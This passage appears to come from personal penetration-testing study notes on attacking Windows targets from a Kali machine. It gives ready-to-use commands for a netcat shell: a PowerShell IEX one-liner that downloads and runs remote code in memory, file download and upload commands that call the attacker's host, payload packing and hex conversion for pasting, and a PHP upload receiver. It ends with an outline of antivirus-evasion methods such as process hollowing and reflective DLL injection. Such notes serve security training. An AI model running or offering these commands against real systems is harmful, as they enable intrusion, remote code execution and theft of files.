and now to follow that on you kali machine make sure you have your web server running ```sudo systemctl start apache2``` and make sure you have the file you want to transfer in your webroot dir ```/var/www/html``` and then run the following command also in your nc session
 ```
 cscript wget.vbs http://<KALI IP>/<FILENAME> <OUTPUTFILE>
 ```

 We can also use powershell to do the same thing in a one-liner as such
 ```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<KALI-IP>/<FILENAME>', 'new-exploit.exe')
 ```
 to download/execute a script without saving it to disk we can use the following 
 ```
 powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://<KALI IP>/<FILENAME>')
 ```
 also in another interesting route we can compress and change the payload to hex and simply copy pasta into our netcat shell.

first we will pack the payload to make it smaller on our kali machine using upx (executable packer) 
```
upx -9 <FILENAME>
```
then we will use the exe2hex tool to change it into hex strings that will output in a file consisting of non-interactive echo commands and a powershell command in which we can paste into our netcat terminal
```
exe2hex -x <PAYLOAD> -p <OUTPUT FILE>
```
to easily put this in your clipboard and save you some heartache use xclip
```
cat <FILENAME > | clip -selection clipboard
```
paste it into your netcat terminal
**uploads**
save the following php file in your webroot directory ```var/www/html/``` as upload.php
```
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```
now create an oploads folder for your new uploads to reside and give www-data ownership of the data
```
sudo mkdir /var/www/uploads
sudo chown www-data: /var/www/uploads
```
now run the following in your netcat terminal
```
powershell (New-Object System.Net.WebClient).UploadFile('http://<KALI IP>/upload.php', '<FILENAME>')

```
## Anitivirus Evasion
### On Disk Evasion
1. **Packers**
   - packers generate a smaller and functionally equivalent executable
2. Obfuscaters
   - obfuscators reorder and mutate code
3. Crypters
   - cryptograpically alers code and adds a decryption stub, on disk data is encrypted decrypted data is in memory
4. Software Protectors
### In Memory Evasion
1. Remote process  memory injection
   - attempts to inject payload into a valid PE
2. Reflective DLL Injection
   - attempts to load DLL stored by the attacker in victim memory
3. Process Hollowing
   - process started, suspended, swapped, then started again
4. Inline Hooking
   - introducing instructions that redirect code execturion into a fuction to malicious code
###  

